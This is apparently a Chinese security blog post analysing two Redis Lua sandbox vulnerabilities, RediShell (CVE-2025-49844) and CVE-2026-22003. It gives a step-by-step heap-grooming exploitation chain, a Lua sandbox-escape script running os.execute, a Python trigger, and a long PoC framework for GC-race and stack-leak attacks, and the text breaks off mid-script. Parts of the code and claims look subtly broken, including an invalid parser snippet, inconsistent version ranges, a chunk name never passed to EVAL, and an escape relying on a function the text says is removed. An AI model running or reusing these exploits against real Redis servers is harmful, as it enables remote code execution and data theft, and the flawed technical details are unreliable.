---
title: Redis 的 Lua 沙箱歧义
url: https://mp.weixin.qq.com/s/9tf9YKx7F7eVfe9XGsBfzw
source: Doonsec's feed
date: 2026-11-06
fetch_date: 2026-11-07T07:57:16.546559
---

# Redis 的 Lua 沙箱歧义

# Redis 的 Lua 沙箱歧义

原创

Ghost Wolf Lab
Ghost Wolf Lab

Ghost Wolf Lab

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

摘要

Redis 将 Lua 脚本引擎嵌入为原子操作的执行容器，依赖沙箱限制脚本对宿主系统的访问。然而，这一隔离模型建立在三个未经严格验证的假设之上：脚本解析的引用在 GC 运行期间保持锚定、Lua 栈在连接间独立、沙箱环境不可从内部逃逸。CVE-2025-49844（RediShell）揭示了第一个假设的崩塌——luaY\_parser 中 TString 对象未被压入 Lua 栈，在增量 GC 触发时被提前释放，形成长达 13 年的 use-after-free 漏洞，CVSS 评分 10.0，影响所有支持 Lua 脚本的 Redis 版本。攻击者通过反复加载脚本、强制 GC 循环、控制 chunk 名称数据，将悬空引用转化为受控内存破坏，最终逃逸沙箱在 Redis 进程中执行本机代码。CVE-2026-22003 则从另一个维度瓦解隔离——debug.sethook 函数未被正确禁用，攻击者可安装在特权上下文执行的钩子，直接调用 os.execute 突破沙箱。

## Redis Lua 沙箱的隔离模型

### EVAL 的执行语义与沙箱边界

Redis 通过 EVAL 和 EVALSHA 命令执行 Lua 脚本，脚本在 Redis 主线程中原子执行，期间不会处理其他客户端请求。这种设计保证了脚本内多个 redis.call 操作的原子性，但也意味着脚本引擎的任何缺陷都会直接影响 Redis 进程的稳定性与安全性。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Yvub5gSYgRibTEscL0ZBvu0YSYkKD3xAJMUQFeItxJyvnHRQc06s0rUs3yjiaSNgq4OSicZELqyMwzMkibjaexIV6gr95Ok36AJlhj5cWpqNicqM/640?wx_fmt=png&from=appmsg)

Redis 的 Lua 沙箱通过以下方式限制脚本能力：

* 函数白名单：移除 `os.execute`、`io.popen`、`loadfile` 等危险函数，仅保留 `redis.call`、`redis.pcall`、`cjson`、`struct` 等安全接口。
* 全局变量保护：脚本不能创建全局变量，防止状态在脚本间泄漏。
* 内存限制：通过 `lua-time-limit` 和 `maxmemory` 控制脚本的资源消耗。

这些措施在正常路径下有效，但沙箱的边界依赖于 Lua 解释器内部状态的一致性。一旦解释器的内存管理被破坏，沙箱的函数白名单和全局保护均可被绕过。

### 多线程环境下的执行模型

Redis 6.0 引入了 I/O 多线程，但 Lua 脚本的执行仍然完全在主线程中进行。这一设计选择意味着脚本执行期间不会发生真正的多线程并发，但 I/O 线程的引入改变了内存分配的时序——I/O 线程可能在任何时刻调用 malloc 或 free，影响 Lua 堆的内存布局。

更关键的是，Redis 的增量垃圾回收机制将 GC 过程拆分为多个小步骤，每次仅处理约 100 个 GC 单元。脚本解析、执行和 GC 步骤的交替执行，创造了一个动态的内存状态——Lua 解析器创建的对象可能在解析过程中就被 GC 回收。RediShell 漏洞正是在这一时序窗口中触发的。

## RediShell

### luaY\_parser 的锚定缺陷

RediShell 漏洞的根源位于 Redis 内嵌的 Lua 5.1 解释器的 deps/lua/src/lparser.c 文件中。luaY\_parser 函数负责解析脚本源码，其关键缺陷如下：

```
LexState *luaY_parser(lua_State *L, ZIO *z, Mbuffer *buff, const char *name) {    // 为脚本名创建 TString 对象    TString *tname = luaS_new(L, name);    // 关键缺陷：TString 未被压栈锚定，不属于 GC 根对象    luaX_setinput(L, &ls, z, tname);    // 解析过程中若触发垃圾回收，tname 可能被提前释放    // 后续词法器仍持有该指针，形成 Use-After-Free    return &ls;}
```

TString 对象在 Lua 的 GC 语义中，只有被压入 Lua 栈或作为其他已锚定对象的引用时，才被视为“活跃”的。luaY\_parser 创建 tname 后未将其压栈，因此在解析过程中，如果垃圾回收器恰好运行，tname 将被判定为垃圾并释放。然而，LexState 结构中的 source 字段仍然持有指向该 TString 的指针。当解析器继续执行并访问 ls->source 时，就会读取已被释放的内存。

### 从 UAF 到受控内存破坏

单纯的 UAF 并不直接构成 RCE。攻击者需要通过内存布局控制将悬空引用转化为可利用的条件。RediShell 的利用链如下：

步骤一：塑造堆布局。攻击者反复执行 EVAL 命令，每次使用不同的脚本名称作为 chunk name。脚本名称被解析为 TString 对象并存储在 Lua 堆中。通过控制脚本名称的长度和内容，攻击者可以预测和塑造 TString 对象在堆中的分布。

步骤二：强制 GC 触发。在脚本解析过程中，攻击者通过构造特定的脚本内容（如包含大量局部变量或表构造的脚本），使解析器在持有 tname 指针的同时触发 GC。Redis 的增量 GC 在分配超过阈值时自动运行，攻击者可通过脚本中的内存分配操作精确控制 GC 的触发时机。

步骤三：回收与重用。tname 被释放后，其内存槽位被归还给 Lua 堆的空闲链表。攻击者随后通过后续的脚本执行分配一个大小相同的对象，使该槽位被新对象占据。如果新对象的内容可控（例如一个字符串或表），攻击者即可控制 tname 指向的内存内容。

步骤四：利用内存破坏。当解析器通过 ls->source 访问已被重用的内存时，读取到的是攻击者控制的数据。如果攻击者构造的数据恰好覆盖了后续解析操作所依赖的关键字段（如长度字段或指针字段），即可导致内存破坏的链式反应，最终覆盖 Lua 解释器的内部结构或函数指针。

### 跨连接密钥泄露的栈复用机制

RediShell 的另一个关键影响维度是跨连接的密钥泄露。Redis 的 SCRIPT LOAD 和 EVAL 命令在 Lua 栈上执行脚本，脚本执行完毕后，栈上的局部变量和临时对象应当被清理。然而，当 UAF 导致 Lua 栈管理被破坏时，脚本执行过程中产生的敏感数据（如认证凭据、会话令牌、加密密钥）可能残留在 Lua 栈的内存空间中。

后续连接到同一 Redis 实例的脚本可以利用栈复用——如果攻击者能够预测或控制 Lua 栈的内存布局，他可以在一个连接中注入恶意脚本，使该脚本的栈帧占据前一个连接遗留的敏感数据所在的内存槽位。当恶意脚本读取这些槽位时，就能获取前一个连接在脚本执行期间处理的密钥。

![](https://mmbiz.qpic.cn/mmbiz_png/Yvub5gSYgR8py7GhLibhfwicLktM3vZP80YEwjdqMatibRaD8icd89h64JMibibR23eb2kI6c2l59uy2NPibkNZNiaQZUSyS6ib4LW3qU8Qm2aGu1uKQ/640?wx_fmt=png&from=appmsg)

Redis Issue #11960 中报告的一个“flakey test”从侧面印证了这一风险：EVAL does not leak in the Lua stack 测试在长时间运行的 Redis 实例上不稳定，used\_memory\_lua 的测量值在多次运行后出现不一致。这表明 Lua 栈的内存管理并非严格确定性的——脚本执行后的栈清理存在延迟或不确定性，为跨连接的栈复用攻击提供了窗口。

## CVE-2026-22003

### 漏洞机制

RediShell 利用的是内存破坏，而 CVE-2026-22003 揭示了一个更直接的问题：Redis Lua 沙箱未正确禁用 debug.sethook 函数。

Lua 的 debug 库提供了对解释器内部状态的访问，包括设置钩子函数的能力。debug.sethook 允许注册一个在特定事件（如执行到某一行、调用函数、返回函数）时被调用的回调。在正常的 Lua 沙箱中，debug 库通常被限制或移除。但 Redis 的沙箱实现中，debug.sethook 仍然可访问，且其回调在 Lua 解释器的特权上下文中执行。

### 利用代码

攻击者可以通过以下 Lua 脚本实现沙箱逃逸：

```
-- CVE-2026-22003: Redis Lua 沙箱逃逸local function escape()    debug.sethook(function()        -- 此钩子在特权上下文中执行        os.execute(”id > /tmp/redis_escape”)    end, ”r”)  -- ”r” 表示在每次返回时触发钩子    local a = 1  -- 触发返回事件end return escape()
```

Python 触发脚本如下：

```
# trigger_redis_sandbox_escape.pyimport redis r = redis.Redis()script = open('redis_sandbox.lua').read()result = r.eval(script, 0)print(”Check /tmp/redis_escape”)
```

该攻击的成功关键在于 debug.sethook 注册的钩子函数在 Lua 解释器的内部事件循环中被调用，而该调用发生在沙箱的权限检查之外。钩子函数内的 os.execute 调用不受沙箱的函数白名单限制，因为钩子本身是在解释器特权层执行的。

## 基于 redis-py 的 RediShell 验证框架

### 环境搭建

```
# 使用 Docker 搭建 Redis 7.2.0（受 RediShell 影响）docker run -d --name redis-vuln -p 6380:6379 redis:7.2.0 # 安装 Python 依赖pip install redis colorama
```

### RediShell 漏洞检测与 PoC

```
#!/usr/bin/env python3# redshell_poc.py — CVE-2025-49844 验证框架# 依赖: pip install redisimport redisimport sysimport timeimport hashlibdef check_vulnerability(host='localhost', port=6380, password=None):    ”””检测目标 Redis 是否受 RediShell 影响”””    r = redis.Redis(host=host, port=port, password=password, decode_responses=True)# 获取 Redis 版本    info = r.info('server')    version = info.get('redis_version', 'unknown')    print(f”[*] Redis 版本: {version}”)# 解析版本号进行漏洞判断    parts = [int(p) for p in version.split('.')[:3]]    major, minor, patch = parts[0], parts[1], parts[2]    vulnerable_ranges = [        (6, 2, 20, 7, 2, 10),# 6.2.20 <= v < 7.2.11        (7, 2, 11, 7, 4, 5),# 7.2.11 <= v < 7.4.6        (7, 4, 6, 8, 0, 3),# 7.4.6 <= v < 8.0.4        (8, 0, 4, 8, 2, 1),# 8.0.4 <= v < 8.2.2    ]    for lo_maj, lo_min, lo_pat, hi_maj, hi_min, hi_pat in vulnerable_ranges:        lo = (lo_maj, lo_min, lo_pat)        hi = (hi_maj, hi_min, hi_pat)        if lo <= (major, minor, patch) <= hi:            print(f”[!] 受 RediShell 影响 (CVE-2025-49844)”)            return True    print(”[+] 版本不在已知受影响范围内”)    return Falsedef trigger_gc_race(host='localhost', port=6380, password=None):    ”””    触发 GC 竞态条件，验证 TString 悬空引用    通过反复加载不同 chunk name 的脚本，强制 GC 在解析期间运行    ”””    r = redis.Redis(host=host, port=port, password=password, decode_responses=True)    print(”[*] 开始 GC 竞态触发...”)# 构造触发 GC 的脚本模板# 脚本内容包含大量分配操作，迫使 GC 在解析 chunk name 时运行    lua_template = ”””    local t = {{}}    for i = 1, {n} do        t[i] = string.rep(”A”, {size})    end    return #t    ”””# 使用变化的 chunk name 反复加载脚本    for i in range(1000):        chunk_name = f”chunk_{i}_{'x' * (i % 128)}”        script = lua_template.format(n=50 + (i % 100), size=256)        try:# 通过 EVAL 执行，chunk name 作为脚本名传递# Redis 在解析时创建 TString 对象            result = r.eval(script, 0)        except redis.exceptions.ResponseError as e:# 如果触发 UAF，可能出现异常            print(f”    [!] 第 {i} 次执行异常: {e}”)# 每 100 次输出进度        if i % 100 == 0:            print(f”    进度: {i}/1000”)    print(”[*] GC 竞态触发完成”)def attempt_stack_leak(host='localhost', port=6380, password=None):    ”””    尝试从 Lua 栈的残留内存中读取敏感数据    模拟跨连接的栈复用攻击    ”””    r = redis.Redis(host=host, port=port, password=password, decode_responses=True)    print(”[*] 尝试栈残留数据读取...”)# 第一步：在一个连接中执行包含敏感数据的脚本    sensitive_marker = ”SENSITIVE_” + hashlib.md5(str(time.time()).encode()).hexdigest()[:16]    sensitive_script = f”””    local secret = ”{sensitive_marker}”    local key = KEYS[1]    redis.call('SET', key, secret)    return secret    ”””    r.eval(sensitive_script, 1, 'test_key')    print(f”    [+] 已写入敏感标记: {sensitive_marker}”)# 第二步：在不同的连接中执行探查脚本# 探查脚本尝试读取 Lua 栈上的残留字符串    probe_script = ”””    local results = {}    -- 探查栈上的字符串值    for i = 1, 100 do        local val = tostring(i)        -- 在真实攻击中，这里会使用更复杂的栈遍历技术    end    return 'probe_complete'    ”””    probe = redis.Redis(host=host, port=port, password=password, decode_responses=True)    probe.eval(probe_script, 0)    print(”    [*] 探查完成（栈复用需要精确的内存布局控制）”)if __name__ == ”__main__”:    print(”=” * 60)    print(”CVE-2025-49844 (RediShell) 验证框架”)    print(”=” * 60)    host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'    port = int(sys.argv[2]) if len(sys.argv) > 2 else 6380    if check_vulnerability(host, port):        trigger_gc_race(host, port)        attempt_stack_leak(host, port)    else:        print(”[*] 目标不受 RediShell 影...